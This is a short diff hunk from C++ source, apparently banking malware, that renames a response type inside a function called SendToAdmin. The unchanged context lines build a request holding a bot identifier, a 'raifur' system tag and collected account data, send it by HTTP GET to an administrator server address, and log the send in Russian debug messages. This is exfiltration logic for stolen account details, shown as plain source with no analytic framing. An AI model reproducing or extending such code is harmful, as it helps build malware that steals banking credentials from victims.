@@ -2146,7 +2146,7 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		GenerateUid(uid.str());
 		wsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&mode=%s&%s", urlAdmin, uid, mode, accs.str() );
 		//отправляем запрос
-		THTTPResponse Response;
+		THTTPResponseRec Response;
 		ClearStruct(Response);
 		HTTP::Get( qr, ret ? &res : 0, &Response );
 		DBGRAFA( "Rafa", "Передали запрос: %s", qr.str() );
